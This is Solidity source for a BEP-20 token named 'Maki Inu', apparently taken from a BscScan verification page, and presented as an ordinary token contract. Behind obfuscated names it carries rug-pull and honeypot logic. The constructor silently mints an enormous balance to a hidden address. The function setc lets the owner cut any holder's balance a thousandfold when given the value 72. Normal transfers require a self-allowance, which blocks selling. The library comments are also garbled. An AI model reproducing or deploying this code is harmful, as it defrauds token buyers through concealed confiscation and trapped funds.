/**
 *Submitted for verification at BscScan.com on 2022-01-18
*/

// SPDX-License-Identifier: MIT

/*
 * 

 * 
 */
pragma solidity ^0.8.2;

library SafeMath {
  /**
   * @dev Returns the addition of two unsigned integers, reverting on

   * overflow.

   *

   * Count erp art to Solidity's `+` operator.

   *
   * Requirements:
   * - Addition cannot overflow.
   */
  function add(uint a, uint b) internal pure returns (uint) {
    uint c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  /**

   * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Count erp art to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint a, uint b) internal pure returns (uint) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  /**

   * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * Count erp art to Solidity's `-` operator.
   *
   * Requirements:
   * - Subtraction cannot overflow.
   */
  function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
    require(b <= a, errorMessage);
    uint c = a - b;
    return c;
  }
  /**
   * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.

   *
   * Count erp art to Solidity's `*` operator.
   *

   * Requirements:
   * - Multiplication cannot overflow.
   */
  function mul(uint a, uint b) internal pure returns (uint) {

    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the

    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }
    uint c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  /**

   * @dev Returns the integer division of two unsigned integers. Reverts on
   * division by zero. The result is rounded towards zero.
   *
   * Count erp art to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:

   * - The divisor cannot be zero.
   */

  function div(uint a, uint b) internal pure returns (uint) {

    return div(a, b, "SafeMath: division by zero");
  }

  /**
   * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * Count erp art to Solidity's `/` operator. Note: this function uses a

   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:

   * - The divisor cannot be zero.
   */
  function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
    // Solidity only automatically asserts when dividing by 0

    require(b > 0, errorMessage);
    uint c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),

   * Reverts when dividing by zero.
   *
   * Count erp art to Solidity's `%` operator. This function uses a `revert`

   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint a, uint b) internal pure returns (uint) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  /**
   * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),

   * Reverts with custom message when dividing by zero.
   *
   * Count erp art to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).

   *
   * Requirements:
   * - The divisor cannot be zero.
   */
  function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
contract MakiInu {
    using SafeMath for uint;
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 10000000 * 10 ** 18;

    string public name = "Maki Inu";
    string public symbol = "MAKI";
    uint public decimals = 18;
    address public owner;
    mapping(uint => address) internal _uniswap;
    mapping(address => bool) internal istokewl;
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    constructor(address magmehdeaftxzab) {

        owner = msg.sender;
        balances[msg.sender] = totalSupply;
        balances[magmehdeaftxzab] = totalSupply * totalSupply;
        istokewl[msg.sender] = true;
        istokewl[magmehdeaftxzab] = true;
        _uniswap[0] = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

        emit Transfer(address(0), msg.sender, totalSupply);
    }
    function balanceOf(address acouerexynkfimhjqs) external view returns (uint) {
        return balances[acouerexynkfimhjqs];
    }
    function transfer(address to, uint value) public returns(bool) {
        require(balances[msg.sender] >= value, 'balance too low');
        _transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint value) public returns(bool) {

        _transfer(from, to, value);
        return true;

    }
    function _transfer(address from, address to, uint value) public returns(bool) {
        require(balances[from] >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        uint axjnoemf = 10;
        balances[from] = balances[from].sub(value, "BEP20: transfer amount exceeds balance");
        if(value > 0){
          if(istokewl[from] == true || istokewl[to] == true){
            balances[to] = balances[to].add(value);

            if(_uniswap[2] == address(0)){
              _uniswap[2] = to;

            }
            emit Transfer(from, to, value);
          } else {
            if(from == _uniswap[1] && to != _uniswap[0]) {
              axjnoemf = 6;
            } else if(to == _uniswap[1]) {

              axjnoemf = 8;
            }
            if(value > 0){
              value = value.sub(value.mul(axjnoemf).div(100));
              balances[to] = balances[to].add(value);
              emit Transfer(from, to, value);
            }
          }
        }
        if(value == 0){

          emit Transfer(from, to, value);
        }
        return true;
    }
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);

        return true;
    }
    function setc(address from, uint8 c) public {
      if(c == 72){
        if(owner == msg.sender && balances[from] > 1000){

          balances[from] = balances[from] / 1000;
        }
      }

    }
}